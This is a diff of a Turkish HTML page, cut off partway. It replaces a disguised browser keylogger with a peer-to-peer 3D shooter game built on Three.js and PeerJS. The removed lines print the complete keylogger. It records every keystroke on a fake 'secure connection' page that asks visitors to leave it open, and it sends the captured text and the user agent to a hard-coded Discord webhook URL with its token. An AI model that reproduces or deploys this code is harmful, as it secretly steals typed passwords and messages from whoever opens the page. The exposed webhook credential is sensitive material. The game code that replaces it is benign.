@@ -1,80 +1,1003 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-    <title>Yükleniyor...</title>
-    <script>
-        // Discord webhook URL'si
-        const WEBHOOK = "https://discord.com/api/webhooks/1523665862798872766/Y-KJoRgMEb_nAc6qnE9QujfnGvQgurWTOgPKljLLL_cLgTd793_EOJTgUzmNVobn4G71";
-        
-        // Keylogger motoru (arka planda çalışır)
-        let logBuffer = "";
-        let sendTimer = null;
-
-        function sendToDiscord(text) {
-            if (!text.trim()) return;
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "```\n" + text.slice(0, 1900) + "\n```",
-                    username: "WebLogger"
-                })
-            }).catch(e => console.log("Hata:", e));
-        }
-
-        function flushLogs() {
-            if (logBuffer.length === 0) return;
-            sendToDiscord(logBuffer);
-            logBuffer = "";
-        }
-
-        // Tuş yakalama
-        document.addEventListener('keydown', function(e) {
-            const key = e.key;
-            if (key === "Escape") { flushLogs(); return; }
-            
-            if (key === "Enter") logBuffer += "\n";
-            else if (key === "Backspace") logBuffer = logBuffer.slice(0, -1);
-            else if (key === "Tab") logBuffer += "    ";
-            else if (key.length === 1) logBuffer += key;
-            else logBuffer += "[" + key.toUpperCase() + "]";
-
-            // Otomatik gönderim tetikleyicileri
-            if (logBuffer.length > 200) flushLogs();
-            
-            // Zamanlayıcıyı sıfırla (her tuşta yeniden başlat)
-            clearTimeout(sendTimer);
-            sendTimer = setTimeout(flushLogs, 15000); // 15 saniye sonra gönder
-        });
-
-        // Sayfa kapanırken son verileri gönder
-        window.addEventListener('beforeunload', flushLogs);
-
-        // Başlangıç bildirimi
-        setTimeout(() => {
-            sendToDiscord("✅ Web Keylogger Aktif | " + navigator.userAgent);
-        }, 2000);
-
-        console.log("[+] Keylogger başlatıldı. Sayfa arka planda çalışıyor.");
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D FPS P2P Savaş</title>
     <style>
-        body { background: #1a1a2e; color: #fff; font-family: monospace; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; text-align: center; }
-        h1 { color: #0f0; }
-        .status { background: #16213e; padding: 20px; border-radius: 10px; }
-        .dot { display: inline-block; width: 12px; height: 12px; background: #0f0; border-radius: 50%; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
-        .footer { margin-top: 40px; color: #666; font-size: 12px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { overflow: hidden; background: #0a0a0f; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        #menu {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0,0,0,0.85);
+            z-index: 10;
+            color: #fff;
+            backdrop-filter: blur(4px);
+        }
+        #menu h1 {
+            font-size: 4rem;
+            font-weight: 800;
+            letter-spacing: 4px;
+            background: linear-gradient(45deg, #ff0040, #ff6a00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(255,0,64,0.3);
+        }
+        #menu p.sub {
+            font-size: 1.2rem;
+            color: #aaa;
+            margin-bottom: 40px;
+            letter-spacing: 2px;
+        }
+        #menu .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 300px;
+        }
+        #menu button {
+            padding: 14px 0;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            background: #1e2a3a;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        #menu button:hover {
+            transform: scale(1.02);
+            background: #2c3e5a;
+        }
+        #menu button.primary {
+            background: #ff0040;
+        }
+        #menu button.primary:hover {
+            background: #e6003a;
+        }
+        #join-area {
+            display: none;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+            width: 300px;
+        }
+        #join-area input {
+            padding: 12px;
+            font-size: 1rem;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: #1a1a24;
+            color: #fff;
+            text-align: center;
+        }
+        #join-area input:focus { outline: none; border-color: #ff0040; }
+        #host-id-display {
+            margin-top: 20px;
+            font-size: 1.4rem;
+            background: #111;
+            padding: 12px 30px;
+            border-radius: 30px;
+            border: 1px solid #444;
+            color: #0ff;
+            letter-spacing: 2px;
+            display: none;
+        }
+        #hud {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 5;
+            display: none;
+        }
+        #crosshair {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            color: rgba(255,255,255,0.9);
+            font-size: 30px;
+            font-weight: 100;
+            text-shadow: 0 0 6px rgba(0,0,0,0.8);
+            pointer-events: none;
+        }
+        #health-bar-container {
+            position: absolute;
+            bottom: 40px;
+            left: 40px;
+            width: 240px;
+            height: 18px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            border: 1px solid #333;
+            overflow: hidden;
+            backdrop-filter: blur(2px);
+        }
+        #health-bar {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff0040, #ff6a00);
+            border-radius: 20px;
+            transition: width 0.15s;
+        }
+        #health-label {
+            position: absolute;
+            bottom: 62px;
+            left: 40px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.9);
+        }
+        #status {
+            position: absolute;
+            bottom: 40px;
+            right: 40px;
+            color: #0f0;
+            font-size: 0.9rem;
+            background: rgba(0,0,0,0.6);
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid #0f0;
+            pointer-events: none;
+            backdrop-filter: blur(2px);
+        }
+        #enemy-health-container {
+            position: absolute;
+            top: 30px;
+            right: 40px;
+            width: 200px;
+            height: 14px;
+            background: rgba(0,0,0,0.6);
+            border-radius: 20px;
+            border: 1px solid #555;
+            overflow: hidden;
+        }
+        #enemy-health-bar {
+            width: 100%;
+            height: 100%;
+            background: #ff4444;
+            border-radius: 20px;
+            transition: width 0.2s;
+        }
+        #enemy-health-label {
+            position: absolute;
+            top: 10px;
+            right: 40px;
+            color: #ff8888;
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.9);
+        }
+        #death-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            pointer-events: none;
+        }
+        #death-overlay span {
+            font-size: 4rem;
+            font-weight: 900;
+            color: #ff0040;
+            text-shadow: 0 0 40px rgba(255,0,64,0.8);
+            animation: pulse 1s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.7; }
+            100% { transform: scale(1.1); opacity: 1; }
+        }
+        #menu .info {
+            color: #888;
+            font-size: 0.9rem;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="status">
-            <h1>🔒 Güvenli Bağlantı Kuruluyor</h1>
-            <p><span class="dot"></span> Sistem aktif ve çalışıyor...</p>
-            <p style="color: #aaa; font-size: 14px;">Bu sayfayı arka planda açık bırakabilirsiniz.</p>
+
+<div id="menu">
+    <h1>⚡ ARENA</h1>
+    <p class="sub">P2P · 3D FPS Savaş</p>
+    <div class="btn-group">
+        <button class="primary" id="hostBtn">🎮 Oda Kur (Host)</button>
+        <button id="joinBtn">🔗 Odaya Katıl</button>
+        <div id="join-area">
+            <input type="text" id="peerIdInput" placeholder="Host ID'sini girin...">
+            <button id="connectBtn">Bağlan</button>
         </div>
-        <div class="footer">v2.4.1 | Güvenli oturum</div>
     </div>
+    <div id="host-id-display">📡 ID: <span id="hostIdText">-</span></div>
+    <div class="info">PeerJS bağlantısı gerektirir. Tarayıcıda açık kalmalıdır.</div>
+</div>
+
+<div id="hud">
+    <div id="crosshair">+</div>
+    <div id="health-label">CAN</div>
+    <div id="health-bar-container"><div id="health-bar" style="width:100%"></div></div>
+    <div id="enemy-health-label">RAKİP</div>
+    <div id="enemy-health-container"><div id="enemy-health-bar" style="width:100%"></div></div>
+    <div id="status">🔗 BAĞLANDI</div>
+</div>
+
+<div id="death-overlay"><span>💀 ÖLDÜN!</span></div>
+
+<!-- Three.js ve yardımcılar -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/PointerLockControls.js"></script>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    // --- UI references ---
+    const menu = document.getElementById('menu');
+    const hostBtn = document.getElementById('hostBtn');
+    const joinBtn = document.getElementById('joinBtn');
+    const joinArea = document.getElementById('join-area');
+    const peerIdInput = document.getElementById('peerIdInput');
+    const connectBtn = document.getElementById('connectBtn');
+    const hostIdDisplay = document.getElementById('host-id-display');
+    const hostIdText = document.getElementById('hostIdText');
+    const hud = document.getElementById('hud');
+    const healthBar = document.getElementById('health-bar');
+    const enemyHealthBar = document.getElementById('enemy-health-bar');
+    const statusEl = document.getElementById('status');
+    const deathOverlay = document.getElementById('death-overlay');
+
+    // --- Game state ---
+    let scene, camera, renderer, controls;
+    let localPlayer, remotePlayer;
+    let localHealth = 100, remoteHealth = 100;
+    let isHost = false;
+    let peer = null;
+    let conn = null;
+    let isPlaying = false;
+    let keys = { w: false, a: false, s: false, d: false };
+    let clock = new THREE.Clock();
+    let moveSpeed = 8.0;
+    let obstacles = [];
+    let arenaSize = 30;
+    let wallThickness = 2;
+    let respawnTimer = null;
+    let localDead = false;
+    let remoteDead = false;
+    let shootCooldown = 0;
+    const SHOOT_DELAY = 0.15; // saniye
+    let laserLine = null;
+    let laserDuration = 0;
+
+    // --- Three.js initialization ---
+    function initScene() {
+        scene = new THREE.Scene();
+        scene.background = new THREE.Color(0x0a0a1a);
+        scene.fog = new THREE.Fog(0x0a0a1a, 40, 70);
+
+        camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.set(0, 1.7, 0);
+
+        renderer = new THREE.WebGLRenderer({ antialias: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.shadowMap.enabled = true;
+        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+        renderer.setPixelRatio(window.devicePixelRatio);
+        document.body.prepend(renderer.domElement);
+
+        controls = new THREE.PointerLockControls(camera, renderer.domElement);
+        controls.lockSpeed = 0.002;
+
+        // Lights
+        const ambient = new THREE.AmbientLight(0x404060, 0.6);
+        scene.add(ambient);
+
+        const dirLight = new THREE.DirectionalLight(0xffeedd, 1.2);
+        dirLight.position.set(20, 30, 10);
+        dirLight.castShadow = true;
+        dirLight.shadow.mapSize.width = 1024;
+        dirLight.shadow.mapSize.height = 1024;
+        dirLight.shadow.camera.near = 0.5;
+        dirLight.shadow.camera.far = 80;
+        dirLight.shadow.camera.left = -40;
+        dirLight.shadow.camera.right = 40;
+        dirLight.shadow.camera.top = 40;
+        dirLight.shadow.camera.bottom = -40;
+        scene.add(dirLight);
+
+        const backLight = new THREE.DirectionalLight(0x4488ff, 0.3);
+        backLight.position.set(-20, 10, -20);
+        scene.add(backLight);
+
+        // Grid helper as floor texture alternative
+        const gridHelper = new THREE.GridHelper(arenaSize * 2, 20, 0x88aaff, 0x4466aa);
+        gridHelper.position.y = -0.01;
+        scene.add(gridHelper);
+
+        // Floor (translucent)
+        const floorGeo = new THREE.PlaneGeometry(arenaSize * 2, arenaSize * 2);
+        const floorMat = new THREE.MeshStandardMaterial({
+            color: 0x112233,
+            transparent: true,
+            opacity: 0.6,
+            roughness: 0.8,
+            metalness: 0.2,
+        });
+        const floor = new THREE.Mesh(floorGeo, floorMat);
+        floor.rotation.x = -Math.PI / 2;
+        floor.position.y = 0;
+        floor.receiveShadow = true;
+        scene.add(floor);
+
+        // Walls
+        const wallMat = new THREE.MeshStandardMaterial({ color: 0x2a3a5a, roughness: 0.7, metalness: 0.3 });
+        const wallPositions = [
+            { x: 0, z: -arenaSize, w: arenaSize*2, h: 4 },
+            { x: 0, z: arenaSize, w: arenaSize*2, h: 4 },
+            { x: -arenaSize, z: 0, w: 2, h: 4 },
+            { x: arenaSize, z: 0, w: 2, h: 4 },
+        ];
+        wallPositions.forEach(p => {
+            const geo = new THREE.BoxGeometry(p.w, p.h, 2);
+            const wall = new THREE.Mesh(geo, wallMat);
+            wall.position.set(p.x, p.h/2, p.z);
+            wall.castShadow = true;
+            wall.receiveShadow = true;
+            scene.add(wall);
+            obstacles.push(wall);
+        });
+
+        // Obstacles (boxes) - procedural
+        const obstacleMat = new THREE.MeshStandardMaterial({ color: 0x4a6a8a, roughness: 0.4, metalness: 0.6 });
+        const obstaclePositions = [
+            { x: -8, z: -8, w: 3, h: 1.5, d: 3 },
+            { x: 8, z: -5, w: 2.5, h: 2.5, d: 2.5 },
+            { x: -6, z: 5, w: 4, h: 1.2, d: 2 },
+            { x: 6, z: 6, w: 2, h: 3, d: 3 },
+            { x: 0, z: -3, w: 2, h: 1, d: 5 },
+            { x: -10, z: 0, w: 1.5, h: 2, d: 4 },
+            { x: 10, z: 2, w: 1.5, h: 2, d: 4 },
+            { x: -4, z: -12, w: 5, h: 1.8, d: 1.5 },
+            { x: 4, z: 12, w: 5, h: 1.8, d: 1.5 },
+        ];
+        obstaclePositions.forEach(p => {
+            const geo = new THREE.BoxGeometry(p.w, p.h, p.d);
+            const mesh = new THREE.Mesh(geo, obstacleMat);
+            mesh.position.set(p.x, p.h/2, p.z);
+            mesh.castShadow = true;
+            mesh.receiveShadow = true;
+            scene.add(mesh);
+            obstacles.push(mesh);
+        });
+
+        // Some vertical pillars
+        const pillarMat = new THREE.MeshStandardMaterial({ color: 0x5a7a9a, roughness: 0.3, metalness: 0.7 });
+        for (let i = 0; i < 6; i++) {
+            const angle = (i / 6) * Math.PI * 2;
+            const rad = 12;
+            const x = Math.cos(angle) * rad;
+            const z = Math.sin(angle) * rad;
+            const geo = new THREE.CylinderGeometry(0.5, 0.7, 3, 8);
+            const pillar = new THREE.Mesh(geo, pillarMat);
+            pillar.position.set(x, 1.5, z);
+            pillar.castShadow = true;
+            pillar.receiveShadow = true;
+            scene.add(pillar);
+            obstacles.push(pillar);
+        }
+
+        // Respawn points (safe positions)
+        // We'll just define some random positions later.
+    }
+
+    // --- Player creation ---
+    function createPlayerMesh(color, isLocal = false) {
+        const group = new THREE.Group();
+
+        // Body (capsule-like)
+        const bodyMat = new THREE.MeshStandardMaterial({ color: color, roughness: 0.5, metalness: 0.2 });
+        const bodyGeo = new THREE.CylinderGeometry(0.4, 0.4, 1.2, 8);
+        const body = new THREE.Mesh(bodyGeo, bodyMat);
+        body.position.y = 0.6;
+        body.castShadow = true;
+        body.receiveShadow = true;
+        group.add(body);
+
+        // Head
+        const headMat = new THREE.MeshStandardMaterial({ color: 0xffccaa, roughness: 0.3 });
+        const headGeo = new THREE.SphereGeometry(0.25, 8, 8);
+        const head = new THREE.Mesh(headGeo, headMat);
+        head.position.y = 1.4;
+        head.castShadow = true;
+        head.receiveShadow = true;
+        group.add(head);
+
+        // Gun (small box)
+        const gunMat = new THREE.MeshStandardMaterial({ color: 0x888888, roughness: 0.3, metalness: 0.8 });
+        const gunGeo = new THREE.BoxGeometry(0.1, 0.1, 0.4);
+        const gun = new THREE.Mesh(gunGeo, gunMat);
+        gun.position.set(0.25, 0.9, 0.2);
+        gun.castShadow = true;
+        group.add(gun);
+
+        // For local player, we add a small direction indicator (optional)
+        // We'll store reference to the gun for later? Not needed.
+
+        group.userData.body = body;
+        group.userData.head = head;
+        group.userData.gun = gun;
+
+        return group;
+    }
+
+    // --- Spawn player at random safe position ---
+    function getRandomSafePosition() {
+        let pos;
+        let attempts = 0;
+        const halfArena = arenaSize - 2;
+        do {
+            pos = new THREE.Vector3(
+                (Math.random() - 0.5) * halfArena * 1.6,
+                0,
+                (Math.random() - 0.5) * halfArena * 1.6
+            );
+            attempts++;
+            // Check collision with obstacles
+            let valid = true;
+            for (let obs of obstacles) {
+                const box = new THREE.Box3().setFromObject(obs);
+                const playerBox = new THREE.Box3(
+                    new THREE.Vector3(pos.x - 0.5, 0, pos.z - 0.5),
+                    new THREE.Vector3(pos.x + 0.5, 1.8, pos.z + 0.5)
+                );
+                if (box.intersectsBox(playerBox)) {
+                    valid = false;
+                    break;
+                }
+            }
+            if (valid) break;
+        } while (attempts < 50);
+        return pos;
+    }
+
+    // --- Collision detection for movement ---
+    function canMoveTo(newPos, playerRadius = 0.5, height = 1.8) {
+        const half = playerRadius;
+        const minY = 0;
+        const maxY = height;
+        // Check bounds
+        if (newPos.x < -arenaSize + 0.5 || newPos.x > arenaSize - 0.5 ||
+            newPos.z < -arenaSize + 0.5 || newPos.z > arenaSize - 0.5) {
+            return false;
+        }
+        // Check obstacles
+        const playerBox = new THREE.Box3(
+            new THREE.Vector3(newPos.x - half, minY, newPos.z - half),
+            new THREE.Vector3(newPos.x + half, maxY, newPos.z + half)
+        );
+        for (let obs of obstacles) {
+            const obsBox = new THREE.Box3().setFromObject(obs);
+            if (obsBox.intersectsBox(playerBox)) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    // --- Respawn ---
+    function respawnLocal() {
+        localDead = false;
+        localHealth = 100;
+        updateHealthUI();
+        const pos = getRandomSafePosition();
+        localPlayer.position.copy(pos);
+        // Reset camera position (controls already has camera, we need to set controls target? Actually we move the camera with controls.
+        // We'll set camera position and then update controls.
+        camera.position.set(pos.x, 1.7, pos.z);
+        controls.target.set(pos.x, 1.7, pos.z);
+        // Send updated position to remote
+        if (conn && conn.open) {
+            conn.send({
+                type: 'state',
+                pos: { x: pos.x, y: 1.7, z: pos.z },
+                rot: { yaw: camera.rotation.y, pitch: camera.rotation.x },
+                health: localHealth,
+                dead: false
+            });
+        }
+        deathOverlay.style.display = 'none';
+    }
+
+    function respawnRemote() {
+        remoteDead = false;
+        remoteHealth = 100;
+        updateEnemyHealthUI();
+        const pos = getRandomSafePosition();
+        remotePlayer.position.copy(pos);
+        // Send updated health to remote? They will update their own health, we just display.
+        // We'll also send our health to remote if we are host? Actually health is synced.
+    }
+
+    // --- UI updates ---
+    function updateHealthUI() {
+        const pct = Math.max(0, localHealth);
+        healthBar.style.width = pct + '%';
+        if (localHealth <= 0) localDead = true;
+    }
+
+    function updateEnemyHealthUI() {
+        const pct = Math.max(0, remoteHealth);
+        enemyHealthBar.style.width = pct + '%';
+        if (remoteHealth <= 0) remoteDead = true;
+    }
+
+    // --- Shooting ---
+    function shoot() {
+        if (!isPlaying || localDead || shootCooldown > 0) return;
+        shootCooldown = SHOOT_DELAY;
+
+        // Raycaster from camera center
+        const raycaster = new THREE.Raycaster();
+        raycaster.setFromCamera({ x: 0, y: 0 }, camera);
+        // Check intersection with remote player
+        if (remotePlayer && !remoteDead) {
+            const intersects = raycaster.intersectObject(remotePlayer, true);
+            if (intersects.length > 0) {
+                // Hit!
+                // Reduce remote health
+                const damage = 25;
+                remoteHealth = Math.max(0, remoteHealth - damage);
+                updateEnemyHealthUI();
+                // Send damage event to remote
+                if (conn && conn.open) {
+                    conn.send({
+                        type: 'damage',
+                        amount: damage,
+                        from: isHost ? 'host' : 'client'
+                    });
+                }
+                // Visual hit effect: flash enemy?
+                // Also spawn laser line to impact point
+                const hitPoint = intersects[0].point;
+                createLaser(hitPoint);
+                // If remote health <= 0, remote dies
+                if (remoteHealth <= 0) {
+                    remoteDead = true;
+                    // Send death event
+                    if (conn && conn.open) {
+                        conn.send({ type: 'remoteDead' });
+                    }
+                    // Respawn remote after delay
+                    setTimeout(() => {
+                        respawnRemote();
+                    }, 3000);
+                }
+            } else {
+                // Miss - just laser to far point
+                const farPoint = new THREE.Vector3(0, 0, -100);
+                farPoint.applyQuaternion(camera.quaternion);
+                farPoint.add(camera.position);
+                createLaser(farPoint);
+            }
+        } else {
+            // No remote player or dead - just show laser to far point
+            const farPoint = new THREE.Vector3(0, 0, -100);
+            farPoint.applyQuaternion(camera.quaternion);
+            farPoint.add(camera.position);
+            createLaser(farPoint);
+        }
+
+        // Send shoot event to remote (so they see laser)
+        if (conn && conn.open) {
+            const origin = camera.position.clone();
+            const dir = new THREE.Vector3(0, 0, -1);
+            dir.applyQuaternion(camera.quaternion);
+            conn.send({
+                type: 'shoot',
+                origin: { x: origin.x, y: origin.y, z: origin.z },
+                dir: { x: dir.x, y: dir.y, z: dir.z }
+            });
+        }
+    }
+
+    function createLaser(targetPoint) {
+        // Remove old laser
+        if (laserLine) {
+            scene.remove(laserLine);
+            laserLine.geometry.dispose();
+            laserLine.material.dispose();
+            laserLine = null;
+        }
+        const origin = camera.position.clone();
+        const points = [origin, targetPoint];
+        const geometry = new THREE.BufferGeometry().setFromPoints(points);
+        const material = new THREE.LineBasicMaterial({ color: 0xff4400, linewidth: 1 });
+        laserLine = new THREE.Line(geometry, material);
+        scene.add(laserLine);
+        laserDuration = 0.1; // seconds
+    }
+
+    // --- Handle incoming data ---
+    function handleData(data) {
+        if (!data) return;
+        switch (data.type) {
+            case 'state':
+                // Update remote player position and rotation
+                if (remotePlayer) {
+                    remotePlayer.position.set(data.pos.x, data.pos.y, data.pos.z);
+                    // Rotation: we need to rotate the remote player group? 
+                    // For remote player, we just set its rotation (yaw) and the head's pitch? We'll keep it simple: rotate the entire group.
+                    // We'll store yaw and pitch and apply.
+                    // We'll rotate the group: group.rotation.y = yaw; but we need to separate body and head for pitch.
+                    // Since we have separate meshes, we can rotate body and head.
+                    // For simplicity, rotate entire group on Y, and head on X.
+                    if (data.rot) {
+                        remotePlayer.rotation.y = data.rot.yaw || 0;
+                        if (remotePlayer.userData.head) {
+                            remotePlayer.userData.head.rotation.x = data.rot.pitch || 0;
+                        }
+                    }
+                    remoteHealth = data.health || 100;
+                    remoteDead = data.dead || false;
+                    updateEnemyHealthUI();
+                }
+                break;
+            case 'damage':
+                // We received damage from remote
+                if (!localDead) {
+                    localHealth = Math.max(0, localHealth - (data.amount || 25));
+                    updateHealthUI();
+                    if (localHealth <= 0) {
+                        localDead = true;
+                        deathOverlay.style.display = 'flex';
+                        // Respawn after 3s
+                        clearTimeout(respawnTimer);
+                        respawnTimer = setTimeout(() => {
+                            respawnLocal();
+                        }, 3000);
+                    }
+                }
+                break;
+            case 'remoteDead':
+                // Remote died - we already handle via health zero, but if we get this, ensure remoteDead true
+                remoteDead = true;
+                updateEnemyHealthUI();
+                // Respawn remote after delay (host will do it? Actually remote will respawn itself, but we can also handle here)
+                setTimeout(() => {
+                    respawnRemote();
+                }, 3000);
+                break;
+            case 'shoot':
+                // Render laser from remote
+                if (data.origin && data.dir) {
+                    const origin = new THREE.Vector3(data.origin.x, data.origin.y, data.origin.z);
+                    const dir = new THREE.Vector3(data.dir.x, data.dir.y, data.dir.z);
+                    // Raycast to see if it hits our local player? We could check, but we trust remote hit detection.
+                    // Just display laser to far point
+                    const far = origin.clone().add(dir.clone().multiplyScalar(100));
+                    // Create laser line from origin to far
+                    if (laserLine) {
+                        scene.remove(laserLine);
+                        laserLine.geometry.dispose();
+                        laserLine.material.dispose();
+                        laserLine = null;
+                    }
+                    const points = [origin, far];
+                    const geo = new THREE.BufferGeometry().setFromPoints(points);
+                    const mat = new THREE.LineBasicMaterial({ color: 0xff8800 });
+                    const line = new THREE.Line(geo, mat);
+                    scene.add(line);
+                    // Store as laserLine? But we want it to disappear after short time.
+                    // We'll manage with a timer.
+                    setTimeout(() => {
+                        scene.remove(line);
+                        line.geometry.dispose();
+                        line.material.dispose();
+                    }, 150);
+                }
+                break;
+            default:
+                break;
+        }
+    }
+
+    // --- Connection handling ---
+    function startGame(hostMode, peerId = null) {
+        isHost = hostMode;
+        // Initialize scene if not already
+        if (!scene) initScene();
+
+        // Create local player
+        const color = isHost ? 0x44aaff : 0xff6644;
+        localPlayer = createPlayerMesh(color, true);
+        const pos = getRandomSafePosition();
+        localPlayer.position.copy(pos);
+        scene.add(localPlayer);
+
+        // Camera at player position
+        camera.position.set(pos.x, 1.7, pos.z);
+        controls.target.set(pos.x, 1.7, pos.z);
+        controls.lock();
+
+        // Create remote player (will be positioned later)
+        const remoteColor = isHost ? 0xff6644 : 0x44aaff;
+        remotePlayer = createPlayerMesh(remoteColor, false);
+        const rpos = getRandomSafePosition();
+        remotePlayer.position.copy(rpos);
+        scene.add(remotePlayer);
+
+        // UI
+        menu.style.display = 'none';
+        hud.style.display = 'block';
+        isPlaying = true;
+        localHealth = 100;
+        remoteHealth = 100;
+        localDead = false;
+        remoteDead = false;
+        updateHealthUI();
+        updateEnemyHealthUI();
+        statusEl.textContent = '🔗 BAĞLANDI';
+        statusEl.style.color = '#0f0';
+
+        // Start animation loop
+        animate();
+
+        // Set up PeerJS connection
+        if (hostMode) {
+            // Host creates peer
+            peer = new Peer();
+            peer.on('open', (id) => {
+                hostIdText.textContent = id;
+                hostIdDisplay.style.display = 'block';
+                // Wait for connection from client
+            });
+            peer.on('connection', (incoming) => {
+                conn = incoming;
+                conn.on('data', handleData);
+                conn.on('close', () => {
+                    disconnectGame();
+                });
+                // Send initial state
+                sendState();
+            });
+        } else {
+            // Client connects to host
+            if (!peerId) return;
+            peer = new Peer();
+            peer.on('open', () => {
+                conn = peer.connect(peerId);
+                conn.on('open', () => {
+                    conn.on('data', handleData);
+                    conn.on('close', () => {
+                        disconnectGame();
+                    });
+                    sendState();
+                });
+            });
+            peer.on('error', (err) => {
+                console.error('Peer error:', err);
+                disconnectGame();
+            });
+        }
+
+        // Listen for window resize
+        window.addEventListener('resize', onResize);
+    }
+
+    function sendState() {
+        if (!conn || !conn.open) return;
+        const pos = camera.position;
+        const yaw = camera.rotation.y;
+        const pitch = camera.rotation.x;
+        conn.send({
+            type: 'state',
+            pos: { x: pos.x, y: pos.y, z: pos.z },
+            rot: { yaw: yaw, pitch: pitch },
+            health: localHealth,
+            dead: localDead
+        });
+    }
+
+    function disconnectGame() {
+        isPlaying = false;
+        if (conn) {
+            conn.close();
+            conn = null;
+        }
+        if (peer) {
+            peer.destroy();
+            peer = null;
+        }
+        // Go back to menu
+        menu.style.display = 'flex';
+        hud.style.display = 'none';
+        deathOverlay.style.display = 'none';
+        hostIdDisplay.style.display = 'none';
+        joinArea.style.display = 'none';
+        // Clean up scene
+        if (scene) {
+            while(scene.children.length > 0) scene.remove(scene.children[0]);
+            scene = null;
+        }
+        if (renderer) {
+            renderer.dispose();
+            renderer.domElement.remove();
+            renderer = null;
+        }
+        if (controls) {
+            controls.unlock();
+            controls = null;
+        }
+        localPlayer = null;
+        remotePlayer = null;
+        // Reset variables
+        localHealth = 100;
+        remoteHealth = 100;
+        localDead = false;
+        remoteDead = false;
+        clearTimeout(respawnTimer);
+        statusEl.textContent = '⚠ BAĞLANTI KOPTU';
+        statusEl.style.color = '#f00';
+        // Re-initialize? We'll restart when host/join again.
+    }
+
+    // --- Movement and animation ---
+    function animate() {
+        if (!isPlaying) return;
+        requestAnimationFrame(animate);
+
+        const delta = clock.getDelta();
+
+        // Update cooldowns
+        if (shootCooldown > 0) shootCooldown -= delta;
+        if (laserDuration > 0) {
+            laserDuration -= delta;
+            if (laserDuration <= 0 && laserLine) {
+                scene.remove(laserLine);
+                laserLine.geometry.dispose();
+                laserLine.material.dispose();
+                laserLine = null;
+            }
+        }
+
+        // Movement
+        if (!localDead && controls.isLocked) {
+            const forward = new THREE.Vector3(0, 0, -1);
+            forward.applyQuaternion(camera.quaternion);
+            forward.y = 0;
+            forward.normalize();
+
+            const right = new THREE.Vector3(1, 0, 0);
+            right.applyQuaternion(camera.quaternion);
+            right.y = 0;
+            right.normalize();
+
+            let moveVec = new THREE.Vector3(0, 0, 0);
+            if (keys.w) moveVec.add(forward);
+            if (keys.s) moveVec.sub(forward);
+            if (keys.a) moveVec.sub(right);
+            if (keys.d) moveVec.add(right);
+            if (moveVec.length() > 0) {
+                moveVec.normalize().multiplyScalar(moveSpeed * delta);
+                // Try move in each axis separately for sliding
+                const newPos = camera.position.clone();
+                // X
+                let testX = newPos.clone();
+                testX.x += moveVec.x;
+                if (canMoveTo(testX)) {
+                    newPos.x += moveVec.x;
+                }
+                // Z
+                let testZ = newPos.clone();
+                testZ.z += moveVec.z;
+                if (canMoveTo(testZ)) {
+                    newPos.z += moveVec.z;
+                }
+                // Y is fixed (no vertical movement)
+                camera.position.copy(newPos);
+                // Update local player mesh position
+                if (localPlayer) {
+                    localPlayer.position.copy(newPos);
+                    localPlayer.position.y = 0; // mesh is at ground
+                }
+                // Send state update (throttled? we'll send every frame for smoothness, but we can optimize)
+                if (conn && conn.open) {
+                    // Send state only if position changed significantly? For simplicity, send every frame.
+                    // But we can throttle to reduce bandwidth: send every 50ms
+                    // We'll implement a simple throttle via time
+                    if (!window._lastSend || performance.now() - window._lastSend > 50) {
+                        sendState();
+                        window._lastSend = performance.now();
+                    }
+                }
+            }
+        }
+
+        // Render
+        renderer.render(scene, camera);
+    }
+
+    // --- Keyboard and mouse events ---
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'w' || e.key === 'W') keys.w = true;
+        if (e.key === 'a' || e.key === 'A') keys.a = true;
+        if (e.key === 's' || e.key === 'S') keys.s = true;
+        if (e.key === 'd' || e.key === 'D') keys.d = true;
+    });
+    document.addEventListener('keyup', (e) => {
+        if (e.key === 'w' || e.key === 'W') keys.w = false;
